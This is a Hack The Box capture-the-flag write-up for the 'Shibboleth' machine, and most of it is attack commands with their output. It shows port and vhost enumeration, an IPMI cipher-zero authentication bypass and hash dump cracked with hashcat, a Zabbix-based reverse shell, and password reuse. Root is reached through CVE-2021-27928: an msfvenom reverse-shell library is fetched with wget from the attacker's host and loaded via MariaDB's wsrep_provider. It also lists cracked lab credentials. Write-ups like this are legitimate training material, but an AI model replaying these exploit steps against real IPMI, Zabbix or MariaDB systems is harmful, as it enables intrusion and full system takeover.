# Shibboleth

This is the writeup of Shibboleth machine from Hack the Box (HTB).

# Port Scan

We’ve started performing a full port scan on the host.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Shibboleth]
└──╼ [★]$ sudo nmap -v -sS -p- -Pn 10.129.222.204

PORT   STATE SERVICE
80/tcp open  http
```

Now let’s perform a detailed versioned port scan on open ports on host.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Shibboleth]                                                                                                                    [60/60]
└──╼ [★]$ sudo nmap -vv -sC -A -Pn -p 80 -oA nmap/shibboleth 10.129.222.204

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone|general purpose|proxy server|WAP|VoIP phone
Running (JUST GUESSING): Google Android 4.4.X (92%), Linux 4.X|5.X|3.X|2.6.X (91%), WebSense embedded (90%), Linksys embedded (90%), Cisco embedded (90%)
OS CPE: cpe:/o:google:android:4.4.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:3 cpe:/h:linksys:ea3500 cpe:/o:linux:linux_ker
nel:2.6.32 cpe:/h:cisco:cp-dx80
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Android 4.4.0 (92%), Linux 4.15 - 5.6 (91%), Websense Content Gateway (90%), Linux 5.3 - 5.4 (90%), Linux 3.6 - 3.10 (90%), Linksys EA3500 WAP (90%), Linux 2.6.32 (90%
), Linux 5.0 - 5.3 (90%), Cisco CP-DX80 collaboration endpoint (Android) (90%), Axis M3006-V network camera (89%)
No exact OS matches for host (test conditions non-ideal).
```

Let’s perform a UDP port scan too.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Shibboleth]                                                                                                                           
└──╼ [★]$ sudo nmap -v -sUV -sC -Pn 10.129.222.204 -oA nmap/shibboleth_udp

PORT    STATE SERVICE  VERSION
623/udp open  asf-rmcp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port623-UDP:V=7.92%I=7%D=2/16%Time=620D425C%P=x86_64-pc-linux-gnu%r(ipm
SF:i-rmcp,1E,"\x06\0\xff\x07\0\0\0\0\0\0\0\0\0\x10\x81\x1cc\x20\x008\0\x01
SF:\x97\x04\x03\0\0\0\0\t");
```

As we can see, we’ve got a host name that we will write down in our local hosts file.

![Untitled](images/Untitled.png)

Accessing the webserver we’ve got.

![Untitled](images/Untitled%201.png)

Let’s running a brute-force directory in background.

# Enumeration

Performing a brute-force directories.

```bash
http://shibboleth.htb/assets               (Status: 301) [Size: 317] [--> http://shibboleth.htb/assets/]
http://shibboleth.htb/forms                (Status: 301) [Size: 316] [--> http://shibboleth.htb/forms/] 
http://shibboleth.htb/server-status        (Status: 403) [Size: 279]                                    
http://shibboleth.htb/changelog.txt        (Status: 200) [Size: 499]                                    
http://shibboleth.htb/Readme.txt
```

On URL [http://shibboleth.htb/forms/Readme.txt](http://shibboleth.htb/forms/Readme.txt) we can see that this webserver is running PHP.

![Untitled](images/Untitled%202.png)

Accessing the other PHP file on `/forms` , we’ve got.

![Untitled](images/Untitled%203.png)

Let’s running `gobuster` again and search for PHP files.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Shibboleth]
└──╼ [★]$ gobuster dir -e -u "http://shibboleth.htb/" -w "/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt" -t 50 -x txt,php -o gobuster/shibboleth_root

http://shibboleth.htb/assets               (Status: 301) [Size: 317] [--> http://shibboleth.htb/assets/]
http://shibboleth.htb/forms                (Status: 301) [Size: 316] [--> http://shibboleth.htb/forms/] 
http://shibboleth.htb/server-status        (Status: 403) [Size: 279]                                    
http://shibboleth.htb/changelog.txt        (Status: 200) [Size: 499]                                    
http://shibboleth.htb/Readme.txt
```

We’ve got the same results.

Let’s check if there are some virtual hosts (vhost).

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Shibboleth]
└──╼ [★]$ gobuster vhost -u "http://shibboleth.htb/" -w "/opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt" -t 50 -o gobuster/shibboleth_vhosts | grep -v "Status: 302"

Found: monitor.shibboleth.htb (Status: 200) [Size: 3686]    
Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686]      
Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686]
```

We’ve found 3 vhosts on the server. Let’s write it down in our local hosts file.

![Untitled](images/Untitled%204.png)

Accessing those 3 vhosts, we’ve got the same Zabbix page login.

![Untitled](images/Untitled%205.png)

We’ve tried some default credentials without success. Let’s brute-forcing the directories of this zabbix vhost.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Shibboleth]                                                                                                                           
└──╼ [★]$ gobuster dir -e -u "http://zabbix.shibboleth.htb/" -w "/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt" -t 50 -x txt,php -o gobuster/shibboleth_zabbix

**http://zabbix.shibboleth.htb/modules              (Status: 301) [Size: 332] [--> http://zabbix.shibboleth.htb/modules/]
http://zabbix.shibboleth.htb/templates.php        (Status: 200) [Size: 1832]
http://zabbix.shibboleth.htb/js                   (Status: 301) [Size: 327] [--> http://zabbix.shibboleth.htb/js/]
http://zabbix.shibboleth.htb/assets               (Status: 301) [Size: 331] [--> http://zabbix.shibboleth.htb/assets/]
http://zabbix.shibboleth.htb/app                  (Status: 301) [Size: 328] [--> http://zabbix.shibboleth.htb/app/]
http://zabbix.shibboleth.htb/include              (Status: 301) [Size: 332] [--> http://zabbix.shibboleth.htb/include/]
http://zabbix.shibboleth.htb/image.php            (Status: 200) [Size: 1828]
http://zabbix.shibboleth.htb/services.php         (Status: 200) [Size: 1831]
http://zabbix.shibboleth.htb/index.php            (Status: 200) [Size: 3686]
http://zabbix.shibboleth.htb/fonts                (Status: 301) [Size: 330] [--> http://zabbix.shibboleth.htb/fonts/]
http://zabbix.shibboleth.htb/audio                (Status: 301) [Size: 330] [--> http://zabbix.shibboleth.htb/audio/]
http://zabbix.shibboleth.htb/conf                 (Status: 301) [Size: 329] [--> http://zabbix.shibboleth.htb/conf/]
http://zabbix.shibboleth.htb/map.php              (Status: 200) [Size: 1826]
http://zabbix.shibboleth.htb/setup.php            (Status: 200) [Size: 1828]
http://zabbix.shibboleth.htb/local                (Status: 301) [Size: 330] [--> http://zabbix.shibboleth.htb/local/]
http://zabbix.shibboleth.htb/history.php          (Status: 200) [Size: 1830]
http://zabbix.shibboleth.htb/maintenance.php      (Status: 200) [Size: 1834]
http://zabbix.shibboleth.htb/applications.php     (Status: 200) [Size: 1835]
http://zabbix.shibboleth.htb/locale               (Status: 301) [Size: 331] [--> http://zabbix.shibboleth.htb/locale/]
http://zabbix.shibboleth.htb/items.php            (Status: 200) [Size: 1828]
http://zabbix.shibboleth.htb/vendor               (Status: 301) [Size: 331] [--> http://zabbix.shibboleth.htb/vendor/]
http://zabbix.shibboleth.htb/robots.txt           (Status: 200) [Size: 974]
http://zabbix.shibboleth.htb/slides.php           (Status: 200) [Size: 1829]
http://zabbix.shibboleth.htb/chart.php            (Status: 200) [Size: 1828]
http://zabbix.shibboleth.htb/graphs.php           (Status: 200) [Size: 1829]
http://zabbix.shibboleth.htb/overview.php         (Status: 200) [Size: 1831]
http://zabbix.shibboleth.htb/screens.php          (Status: 200) [Size: 1830]
http://zabbix.shibboleth.htb/server-status        (Status: 403) [Size: 286]
http://zabbix.shibboleth.htb/hosts.php            (Status: 200) [Size: 1828]
http://zabbix.shibboleth.htb/queue.php            (Status: 200) [Size: 1828]
http://zabbix.shibboleth.htb/triggers.php         (Status: 200) [Size: 1831]
http://zabbix.shibboleth.htb/report2.php          (Status: 200) [Size: 1830]
http://zabbix.shibboleth.htb/chart2.php           (Status: 200) [Size: 1829]
http://zabbix.shibboleth.htb/index.php            (Status: 200) [Size: 3686]**
```

Let’s enumerate the UDP port 623 that was found open on our UDP port scan previously.

Checking the version of IPMI, we’ve got.

```bash
msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.222.204->10.129.222.204 (1 hosts)
[+] 10.129.222.204:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Using a auxiliary module from Metasploit in order to check if this version is vulnerable, we’ve got.

```bash
msf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) > run

[*] Sending IPMI requests to 10.129.222.204->10.129.222.204 (1 hosts)
[+] 10.129.222.204:623 - IPMI - VULNERABLE: Accepted a session open request for cipher zero
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

It seems to be vulnerable. Using `ipmitool` we’ve pass as user `Administrator` without password.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Shibboleth]                                                                                                                           
└──╼ [★]$ ipmitool -I lanplus -C 0 -H 10.129.222.204 -U Administrator -P ''  user list                                                                                                        
ID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit                                                                                                                         
1                    true    false      false      USER                                                                                                                                       
2   Administrator    true    false      true       USER                                                                                                                                       
3                    true    false      false      Unknown (0x00)                                                                                                                             
4                    true    false      false      Unknown (0x00)                                                                                                                             
5                    true    false      false      Unknown (0x00)

...
```

As we can see, we’ve got a valid user. Knowing that the Administrator is a valid user and his id is 2, let’s try to change his password.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Shibboleth]
└──╼ [★]$ ipmitool -I lanplus -C 0 -H 10.129.222.204 -U Administrator -P '' user set password 2 hacker
Set User Password command successful (user 2)
```

Now, let’s try to log into Zabbix. We weren’t able to login using the password we’ve set.

Let’s search on metasploit about other modules for IPMI.

```bash
msf6 > search ipmi

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank    Check  Description
   -  ----                                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ipmi/ipmi_cipher_zero                 2013-06-20       normal  No     IPMI 2.0 Cipher Zero Authentication Bypass Scanner
   1  auxiliary/scanner/ipmi/ipmi_dumphashes                  2013-06-20       normal  No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
   2  auxiliary/scanner/ipmi/ipmi_version                                      normal  No     IPMI Information Discovery
   3  exploit/multi/upnp/libupnp_ssdp_overflow                2013-01-29       normal  No     Portable UPnP SDK unique_service_name() Remote Code Execution
   4  auxiliary/scanner/http/smt_ipmi_cgi_scanner             2013-11-06       normal  No     Supermicro Onboard IPMI CGI Vulnerability Scanner
   5  auxiliary/scanner/http/smt_ipmi_49152_exposure          2014-06-19       normal  No     Supermicro Onboard IPMI Port 49152 Sensitive File Exposure
   6  auxiliary/scanner/http/smt_ipmi_static_cert_scanner     2013-11-06       normal  No     Supermicro Onboard IPMI Static SSL Certificate Scanner
   7  exploit/linux/http/smt_ipmi_close_window_bof            2013-11-06       good    Yes    Supermicro Onboard IPMI close_window.cgi Buffer Overflow
   8  auxiliary/scanner/http/smt_ipmi_url_redirect_traversal  2013-11-06       normal  No     Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal
```

We have a module that dumps the hashes users for us, let’s use it.

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                              Required  Description
   ----                  ---------------                                              --------  -----------
   CRACK_COMMON          true                                                         yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                   no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passwor  yes       File containing common passwords for offline cracking, one per line
                         ds.txt
   RHOSTS                                                                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 623                                                          yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                            yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                            yes       Delay between session retries in seconds
   THREADS               1                                                            yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users.t  yes       File containing usernames, one per line
                         xt

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.129.202.107
RHOSTS => 10.129.202.107
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.202.107:623 - IPMI - Hash found: Administrator:afcd7bf982010000b4ca49b5a51d1b5f76a167c21f3bd64ed357e388d5e1f8cefd5510e45ac24e7da123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:7ef0d26bf14fb4a3d95ad7be248fc59a6dab709c
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Now, let’s try to crack this hash for Administrator user.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ hashcat -m 7300 Administrator.hash /usr/share/wordlists/rockyou.txt

...

afcd7bf982010000b4ca49b5a51d1b5f76a167c21f3bd64ed357e388d5e1f8cefd5510e45ac24e7da123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:7ef0d26bf14fb4a3d95ad7be248fc59a6dab709c:ilovepumkinpie1

...
```

We were able to crack the hash.

| USER | PASSWORD | SERVICE |
| --- | --- | --- |
| Administrator | ilovepumkinpie1 | Zabbix/IPMI |
| ipmi-svc | ilovepumkinpie1 | Linux User |
| zabbix | bloooarskybluh | MySQL |

Let’s try to log into Zabbix now.

![Untitled](images/Untitled%206.png)

We are in. Now let’s search about a entry point in order to get a shell on host.

Adding it on host defined on Zabbix and Add Item, we’ve save and execute it.

![Untitled](images/Untitled%207.png)

Back to our netcat listener.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ sudo nc -vnlp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.202.107.
Ncat: Connection from 10.129.202.107:45024.
bash: cannot set terminal process group (1015): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@shibboleth:/$ id
id
uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
```

We’ve got a shell. Now, let’s improve our shell for a full tty shell.

Now let’s try a reuse that password Administrator for user `ipmi-svc`

```bash
zabbix@shibboleth:/home$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 Oct 16 12:24 .
drwxr-xr-x 19 root     root     4096 Oct 16 16:41 ..
drwxr-xr-x  3 ipmi-svc ipmi-svc 4096 Oct 16 12:23 ipmi-svc

zabbix@shibboleth:/home$ su ipmi-svc
Password: 
ipmi-svc@shibboleth:/home$ id
uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)
```

We are as `ipmi-svc` user.

Running linPEAS on host, we’ve got a MySQL credentials.

Connecting to MySQL, we’ve got the following hashes from zabbix database.

```bash
MariaDB [zabbix]> select userid,alias,name,passwd from users;
+--------+---------------+--------------+--------------------------------------------------------------+
| userid | alias         | name         | passwd                                                       |
+--------+---------------+--------------+--------------------------------------------------------------+
|      1 | Admin         | Zabbix       | $2y$10$L9tjKByfruByB.BaTQJz/epcbDQta4uRM/KySxSZTwZkMGuKTPPT2 |
|      2 | guest         |              | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |
|      3 | Administrator | IPMI Service | $2y$10$FhkN5OCLQjs3d6C.KtQgdeCc485jKBWPW4igFVEgtIP3jneaN7GQe |
+--------+---------------+--------------+--------------------------------------------------------------+
```

# Privilege Escalation

After a lot of search in order to check any entry point for privilege escalation to root, we’ve came to a MySQL version installed on the system.

```bash
ipmi-svc@shibboleth:/tmp$ mysql --version
mysql  Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
```

There is an exploit on [https://github.com/Al1ex/CVE-2021-27928](https://github.com/Al1ex/CVE-2021-27928). First, let’s generate our payload using msfvenom.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation/privesc]
└──╼ [★]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.63 LPORT=9001 -f elf-so -o jpfdevs.so

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: jpfdevs.so
```

Now let’s send it to the host.

```bash
ipmi-svc@shibboleth:/tmp$ wget http://10.10.14.63/jpfdevs.so
--2022-02-16 23:15:34--  http://10.10.14.63/jpfdevs.so
Connecting to 10.10.14.63:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 476 [application/octet-stream]
Saving to: ‘jpfdevs.so’

jpfdevs.so                                      100%[=====================================================================================================>]     476  --.-KB/s    in 0s      

2022-02-16 23:15:34 (1.25 MB/s) - ‘jpfdevs.so’ saved [476/476]
```

Now let’s connect to MySQL and execute the payload.

```bash
ipmi-svc@shibboleth:/tmp$ mysql -u zabbix -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 3212
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SET GLOBAL wsrep_provider="/tmp/jpfdevs.so";
```

Back to our netcat listener.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation/privesc]
└──╼ [★]$ nc -vnlp 9001
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.202.107.
Ncat: Connection from 10.129.202.107:33630.
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@shibboleth:/var/lib/mysql# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Now we are root!

![Untitled](images/Untitled%208.png)